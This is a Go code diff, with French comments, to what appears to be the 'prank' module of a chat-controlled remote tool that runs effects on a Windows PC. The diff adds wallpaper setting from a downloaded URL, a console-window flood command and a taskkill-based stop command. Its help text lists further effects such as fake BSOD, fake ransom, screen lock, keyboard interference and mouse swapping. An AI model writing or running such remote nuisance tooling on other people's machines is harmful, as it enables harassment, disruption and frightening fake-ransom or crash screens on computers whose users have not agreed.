@@ -7,7 +7,9 @@ package main
 
 import (
 	"fmt"
+	"os/exec"
 	"strings"
+	"time"
 )
 
 // prankRun exécute un effet. kind : msg, wall, url, speak, beep, cd, rotate,
@@ -27,7 +29,12 @@ func prankRun(kind, arg string) string {
 
 	case "wall", "wallpaper":
 		if a == "" {
-			return "usage : !prank wall <chemin image>"
+			return "usage : !prank wall <chemin image | URL>"
+		}
+		if st := strings.ToLower(a); strings.HasPrefix(st, "http") {
+			if p, err := downloadToTemp(a); err == nil {
+				a = p
+			}
 		}
 		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class WP { [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern bool SystemParametersInfo(uint a, uint b, string c, uint d); }';` +
 			"[WP]::SystemParametersInfo(20,0," + qPS(a) + ",3) | Out-Null"
@@ -181,7 +188,36 @@ func prankRun(kind, arg string) string {
 		}
 		return "son coupé (renvoyer la commande le remet)."
 
+	case "flood", "terminaux":
+		// Ouvre N consoles visibles portant le texte demandé. Chaque fenêtre
+		// porte le titre PRANK, ce qui permet à `!prank stop` de les fermer
+		// sans toucher aux autres.
+		parts := strings.SplitN(strings.TrimSpace(arg), " ", 2)
+		n := 5
+		if v, err := atoi(parts[0]); err == nil && v > 0 && v <= 30 {
+			n = v
+		}
+		txt := "Bonjour"
+		if len(parts) > 1 && strings.TrimSpace(parts[1]) != "" {
+			txt = strings.TrimSpace(parts[1])
+		}
+		safe := strings.ReplaceAll(txt, `"`, "")
+		for i := 0; i < n; i++ {
+			c := exec.Command("cmd.exe", "/c", "start", "", "cmd.exe", "/k",
+				"title PRANK & echo "+safe)
+			_ = c.Start()
+			time.Sleep(120 * time.Millisecond)
+		}
+		return fmt.Sprintf("%d console(s) ouverte(s) avec « %s » — fermer : !prank stop", n, safe)
+
+	case "stop", "arret":
+		// Ferme uniquement les consoles ouvertes par flood (titre PRANK).
+		c := exec.Command("taskkill.exe", "/FI", "WINDOWTITLE eq PRANK*", "/F")
+		c.SysProcAttr = hiddenAttr()
+		_ = c.Run()
+		return "consoles du prank fermées."
+
 	default:
-		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse, bsod, ransom, jiggle, keyboard, mute"
+		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse, bsod, ransom, jiggle, keyboard, mute, flood <n> <texte>, stop"
 	}
 }
